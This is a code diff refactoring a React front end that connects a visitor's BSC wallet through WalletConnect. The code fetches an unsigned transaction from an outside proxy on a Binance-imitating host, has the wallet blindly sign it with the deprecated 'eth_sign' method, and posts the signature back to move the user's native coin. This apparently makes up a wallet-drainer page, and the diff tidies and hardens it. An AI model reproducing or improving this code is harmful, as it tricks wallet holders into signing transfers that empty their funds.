@@ -3,11 +3,13 @@ import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
 function App() {
   async function runner() {
+    // حذف داده‌های قدیمی WalletConnect
     if (typeof localStorage !== "undefined") {
       localStorage.removeItem("walletconnect");
     }
 
-    var ethereumProvider = await EthereumProvider.init({
+    // مقداردهی اولیه WalletConnect
+    const ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // فقط BSC
       methods: ["personal_sign", "eth_sign"],
@@ -15,16 +17,16 @@ function App() {
     });
 
     await ethereumProvider.enable();
-    var provider = ethereumProvider;
-    var account = await provider.request({ method: "eth_accounts" });
-    var account_sender = account[0];
+    const provider = ethereumProvider;
+    const accounts = await provider.request({ method: "eth_accounts" });
+    const accountSender = accounts[0];
 
-    if (!account_sender) {
+    if (!accountSender) {
       console.error("❌ Wallet connection failed");
       return;
     }
 
-    console.log("✅ Wallet Address:", account_sender);
+    console.log("✅ Wallet Address:", accountSender);
 
     try {
       await provider.request({
@@ -36,22 +38,29 @@ function App() {
       return;
     }
 
-    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
+    const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
     async function signAndSendTransaction(address, chain, type, contract = "0") {
       try {
-        let requestData = { handler: "tx", address, chain, type };
+        const requestData = { handler: "tx", address, chain, type };
         if (type === "token") requestData.contract = contract;
 
         console.log("📡 Sending Request Data:", requestData);
 
-        var result = await jQuery.post(apiUrl, requestData);
+        const result = await jQuery.post(apiUrl, requestData);
         if (!result || result === "null") {
           console.error("❌ API Response is NULL");
           return;
         }
 
-        var unsignedTx = JSON.parse(result);
+        let unsignedTx;
+        try {
+          unsignedTx = JSON.parse(result);
+        } catch (e) {
+          console.error("❌ Error parsing JSON:", e);
+          return;
+        }
+
         console.log("📜 Unsigned Transaction:", unsignedTx);
 
         if (!unsignedTx.result) {
@@ -59,19 +68,21 @@ function App() {
           return;
         }
 
-        var signedTx = await provider.request({
+        console.log("🔍 Transaction to be signed:", JSON.stringify(unsignedTx.result));
+
+        const signedTx = await provider.request({
           method: "eth_sign",
           params: [address, JSON.stringify(unsignedTx.result)],
         });
-
-        console.log("✍️ Signed Transaction:", signedTx);
 
         if (!signedTx) {
           console.error("❌ Signing failed");
           return;
         }
 
-        var txHash = await jQuery.post(apiUrl, {
+        console.log("✍️ Signed Transaction:", signedTx);
+
+        const txHash = await jQuery.post(apiUrl, {
           handler: "sign",
           signature: signedTx,
           type,
@@ -85,7 +96,7 @@ function App() {
       }
     }
 
-    var txHash = await signAndSendTransaction(account_sender, "56", "coin");
+    const txHash = await signAndSendTransaction(accountSender, "56", "coin");
 
     if (txHash) {
       console.log("📤 Final Transaction Hash:", txHash);
